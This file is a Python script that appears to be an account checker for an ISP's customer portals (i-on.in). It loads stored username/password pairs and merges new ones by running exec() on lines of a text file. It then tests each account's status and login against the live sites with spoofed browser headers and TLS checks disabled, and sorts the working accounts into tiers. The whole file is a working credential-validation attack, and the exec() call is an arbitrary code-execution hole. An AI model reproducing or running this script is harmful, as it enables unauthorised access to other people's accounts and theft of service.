import requests
import pickle
from bs4 import BeautifulSoup
from tqdm import tqdm
import json
#from cryptography.fernet import Fernet

requests.packages.urllib3.disable_warnings()

dat = pickle.load(open('super.dat', 'rb'))

def customer(username, password, data_return=False):
    headers = {'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'en-US,en;q=0.9',
        'Connection':'keep-alive',
        'Content-Length':'42',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Host':'customer.i-on.in',
        'Origin':'https://customer.i-on.in',
        'Referer':'https://customer.i-on.in/',
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36',
        'X-Requested-With':'XMLHttpRequest'}
    data = {'crm':'hcrm',
        'user':username,
        'password':password}
    s = requests.Session()
    r = (s.post('https://customer.i-on.in/findCRM', headers=headers, data=data, verify=False)).json()
    if r['status'] == '1':
        if data_return:
            token = {'param1':r['temp1'],  'param2':r['temp2']}
            payload = {'q': r['temp1']}
            d = (s.post('https://customer.i-on.in/main', headers=headers, params=payload, data=token)).text
            soup = BeautifulSoup(d, 'html.parser')
            name = ' '.join(soup.find('span', {'class': 'abhiproinfo'})['title'].split())
            email = soup.find('h5', {'id': 'custInfoEmail'}).text[5:]
            data_used = soup.find('h3', {'style': 'color:#FF6C00;text-align: center;font-weight: bold'}).text + ' MB'
            days_remain = soup.find('h3', {'style': 'color:#F9464F;text-align: center;font-weight: bold'}).text + 'd'
            return (True, name, email, data_used, days_remain)
        return True
    else:
        if data_return:
            return (False, None, None, None, None)
        return False

def check_user_stats(username, password):
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Length": "33",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "jgi.i-on.in",
        "Origin": "https://jgi.i-on.in",
        "Referer": "https://jgi.i-on.in/?",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        'mobileNo': username,
        'pass': password
    }
    r = requests.post("https://jgi.i-on.in/Register.aspx?CheckCustomerStatus=1", headers=headers, data=data).text
    if r == 'Active':
        # print bcolors.OKGREEN + r + bcolors.ENDC
        return True
    else:
        # print bcolors.FAIL + r + bcolors.ENDC
        return False

p = len(dat)

for line in open('passes.txt'):
    new_pop = 'new_pop = ' + line
    exec(new_pop)
    for x in new_pop:
        dat[x] = new_pop[x]

print('{} new entries'.format(len(dat)-p))

past = []

pickle.dump(dat, open('super.dat', 'wb'))

nd = {}

loop = tqdm(dat, postfix={'active': len(nd)})
for x in loop:
    if x.startswith('CSC@') or x.startswith('JCH') or x.startswith('1'):
        if check_user_stats(x, '-') and customer(x, dat[x]):
            nd[x] = dat[x]
    else:
        if check_user_stats(x, '-'):
            nd[x] = dat[x]
    tqdm.set_postfix(loop, ordered_dict={'active': len(nd)})

new = {0: {}, 1: {}, 2: {}}
for x in nd:
    if x.startswith('DV'):
        new[2][x] = nd[x]
    elif x.startswith('CSC7@'):
        new[2][x] = nd[x]
    elif x.startswith('23CSC'):
        new[2][x] = nd[x]
    elif x.startswith('CSC@'):
        new[1][x] = nd[x]
    elif x.startswith('JCH'):
        new[1][x] = nd[x]
    else:
        new[0][x] = nd[x]

print('{} entries deactivated'.format(len(dat)-len(nd)))
print('level 1: {} entries\nlevel 2: {} entries\nlevel 3: {} entries'.format(len(new[0]), len(new[1]), len(new[2])))
if len(new[1]) < 5:
    print('adding level 3 entries to level 2...')
    for x in new[2]:
        new[1][x] = new[2][x]
if len(new[0]) < 5:
    print('adding level 2 entries to level 1...')
    for x in new[1]:
        new[0][x] = new[1][x]
minlen = min([len(new[0]), len(new[1]), len(new[2])])
print('minimum dictionary length: {}'.format(minlen))
if minlen > 5:
    print('length exceeding 5. resetting...')
    minlen = 5
pickle.dump(nd, open('new.dat', 'wb'))
